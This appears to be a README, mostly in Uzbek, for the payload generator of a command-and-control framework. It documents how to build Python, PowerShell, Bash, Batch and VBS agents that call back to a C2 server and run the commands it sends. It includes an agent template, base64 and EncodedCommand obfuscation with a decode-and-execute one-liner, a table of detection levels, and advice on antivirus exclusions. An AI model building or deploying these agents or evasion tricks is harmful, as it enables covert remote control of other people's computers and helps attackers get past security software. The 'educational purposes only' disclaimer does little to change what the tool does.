# Payload Generator - C2 Platform

Payload Generator - turli formatdagi malicious payloadlar yaratish uchun modul.

## 📋 Qo'llanma

### Payload Turlari

| Tur | Fayl | Platform | Obfuscation |
|-----|------|----------|-------------|
| **Python** | `.py` | Cross-platform | ✅ Base64 |
| **PowerShell** | `.ps1` | Windows | ✅ EncodedCommand |
| **Bash** | `.sh` | Linux/macOS | ✅ Base64 |
| **Batch** | `.bat` | Windows | ❌ |
| **VBScript** | `.vbs` | Windows | ❌ |
| **EXE** | `.exe` | Windows | 🚧 PyInstaller kerak |
| **DLL** | `.dll` | Windows | 🚧 Coming soon |

---

## 🚀 Ishlatish

### 1. CLI orqali

```bash
# Python payload
python -m common.payload_generator -t python -o agent.py

# PowerShell payload with obfuscation
python -m common.payload_generator -t powershell -o agent.ps1 --obfuscate

# Bash payload
python -m common.payload_generator -t bash -o agent.sh -H 192.168.1.100 -p 8080

# Batch payload
python -m common.payload_generator -t batch -o agent.bat
```

**Parametrlar:**
- `-t, --type`: Payload turi (python, powershell, bash, batch, vbs, exe, dll)
- `-l, --listener`: Listener turi (http, tcp) - default: http
- `-H, --host`: Server IP/hostname - default: 127.0.0.1
- `-p, --port`: Server port - default: 8080
- `-o, --output`: Output fayl nomi (majburiy)
- `--obfuscate`: Obfuscation yoqish

---

### 2. GUI orqali

**Windows:**
```batch
start_payload_generator.bat
```

**Linux/macOS:**
```bash
chmod +x start_payload_generator.sh
./start_payload_generator.sh
```

Yoki Havoc GUI ichidan: **Payloads → Payload Generator**

---

### 3. Server CLI orqali

```bash
# Server CLI ni ishga tushirish
python server/cli.py

# Payload yaratish
C2> payload python agent.py
C2> payload powershell agent.ps1 --obfuscate
C2> payload bash agent.sh
```

---

## 🛠️ Payload Generator GUI

![Payload Generator GUI](https://via.placeholder.com/800x600?text=Payload+Generator+GUI)

### Funksiyalar:

1. **Configuration**
   - Server Host/Port sozlash
   - Payload type tanlash
   - Listener type tanlash (HTTP/TCP)

2. **Options**
   - Obfuscation yoqish/o'chirish
   - Output fayl nomi belgilash

3. **Actions**
   - 🚀 Generate Payload - Payload yaratish
   - 👁️ Preview - Kod preview ko'rish
   - 💾 Save - Faylga saqlash

4. **Status**
   - Real-time log
   - Payload size
   - Timestamp

---

## 📝 Python Payload Misol

```python
#!/usr/bin/env python3
"""
C2 Agent Payload - Python
Auto-generated: 2025-12-22T10:30:00
"""

import requests
import subprocess
import json
import time
import socket
import uuid
from datetime import datetime

# Configuration
SERVER_URL = "http://127.0.0.1:8080"
HEARTBEAT_INTERVAL = 30

def get_agent_id():
    """Generate unique agent ID"""
    return str(uuid.uuid4())

def register(agent_id):
    """Register with C2 server"""
    try:
        response = requests.post(
            f"{SERVER_URL}/api/register",
            json={"agent_id": agent_id, "agent_info": get_system_info()},
            timeout=10
        )
        return response.status_code == 200
    except:
        return False

def main():
    """Main agent loop"""
    agent_id = get_agent_id()
    
    # Register
    if not register(agent_id):
        return
    
    # Main loop
    while True:
        try:
            commands = heartbeat(agent_id)
            for cmd in commands:
                if cmd.get('type') == 'exec':
                    execute_command(cmd)
            time.sleep(HEARTBEAT_INTERVAL)
        except KeyboardInterrupt:
            break
        except:
            time.sleep(5)

if __name__ == "__main__":
    main()
```

---

## 🔒 Obfuscation

### Python (Base64)

**Original:**
```python
import requests
print("Hello World")
```

**Obfuscated:**
```python
import base64
exec(base64.b64decode("aW1wb3J0IHJlcXVlc3RzCnByaW50KCJIZWxsbyBXb3JsZCIp").decode())
```

### PowerShell (EncodedCommand)

**Original:**
```powershell
Invoke-WebRequest -Uri "http://server/api"
```

**Obfuscated:**
```powershell
powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0...
```

### Bash (Base64)

**Original:**
```bash
curl http://server/api
```

**Obfuscated:**
```bash
echo "Y3VybCBodHRwOi8vc2VydmVyL2FwaQ==" | base64 -d | bash
```

---

## 🎯 HTTP vs TCP Payloads

### HTTP Payload

**Xususiyatlari:**
- ✅ REST API orqali muloqot
- ✅ JSON ma'lumot formati
- ✅ Firewall friendly (80/443 portlar)
- ✅ HTTPS encryption mumkin
- ❌ Biroz sekinroq

**Ishlatish:**
```bash
python -m common.payload_generator -t python -l http -o http_agent.py
```

### TCP Payload

**Xususiyatlari:**
- ✅ To'g'ridan-to'g'ri socket ulanish
- ✅ Past latency
- ✅ Binary ma'lumot
- ❌ Firewall bloklashi mumkin
- ❌ Traffic ochiq ko'rinadi

**Ishlatish:**
```bash
python -m common.payload_generator -t python -l tcp -o tcp_agent.py
```

---

## 📊 Payload Comparison

| Feature | Python | PowerShell | Bash | Batch | VBS |
|---------|--------|------------|------|-------|-----|
| **Platform** | All | Windows | Linux/macOS | Windows | Windows |
| **Size** | ~3KB | ~2KB | ~1.5KB | ~500B | ~800B |
| **Obfuscation** | ✅ | ✅ | ✅ | ❌ | ❌ |
| **Dependencies** | requests | Built-in | curl | curl | Built-in |
| **Detection** | Medium | Low | Medium | High | Medium |

---

## 🔧 Customization

### Template o'zgartirish

Payload templatelarni `common/payload_generator.py` faylida o'zgartirish mumkin:

```python
def _get_python_template(self) -> str:
    """Python payload template"""
    return '''#!/usr/bin/env python3
    # Your custom template here
    '''
```

### Yangi payload type qo'shish

```python
# 1. Template qo'shish
self.templates['ruby'] = self._get_ruby_template()

# 2. Template funksiyasi yaratish
def _get_ruby_template(self) -> str:
    return '''#!/usr/bin/env ruby
    # Ruby payload template
    '''
```

---

## ⚠️ Security Warning

**Diqqat:**
- Payloadlar malicious kod hisoblanadi
- Faqat test muhitda ishlatish
- Antiviruslar detect qilishi mumkin
- Legal purposes only!

**Obfuscation detection:**
- Base64 encoding - oson detect qilinadi
- Advanced obfuscation kerak (pyarmor, pyinstaller, etc.)

---

## 🧪 Testing

### 1. Payload yaratish

```bash
python -m common.payload_generator -t python -o test_agent.py
```

### 2. Server ishga tushirish

```bash
python server/app.py
```

### 3. Payload run qilish

```bash
python test_agent.py
```

### 4. Server logs

```
✅ New agent registered: a1b2c3d4-...
💓 Heartbeat from agent: a1b2c3d4-...
```

---

## 📚 Qo'shimcha Ma'lumot

### Aloqador fayllar:
- [common/payload_generator.py](../common/payload_generator.py) - Payload generator moduli
- [gui/payload_generator_gui.py](../gui/payload_generator_gui.py) - GUI interface
- [server/cli.py](../server/cli.py) - CLI interface (payload command)

### Aloqador doc'lar:
- [CONNECTION_FLOW.md](CONNECTION_FLOW.md) - Connection flow tushuntirish
- [CROSS_PLATFORM.md](CROSS_PLATFORM.md) - Cross-platform support
- [README.md](../README.md) - Umumiy qo'llanma

---

## 🐛 Troubleshooting

### Muammo: "Module not found: requests"

**Yechim:**
```bash
pip install -r requirements.txt
```

### Muammo: Permission denied (.sh files)

**Yechim:**
```bash
chmod +x *.sh
chmod +x start_payload_generator.sh
```

### Muammo: Antivirus blocks payload

**Yechim:**
- Test folder antivirus exclusion listiga qo'shing
- Virtual Machine ishlatish tavsiya qilinadi

### Muammo: GUI ochilmaydi

**Yechim:**
```bash
# Tkinter o'rnatish
sudo apt-get install python3-tk  # Ubuntu/Debian
sudo yum install python3-tkinter  # CentOS/RHEL
```

---

## 📄 License

Educational purposes only. Faqat o'z test muhitingizda ishlatish!
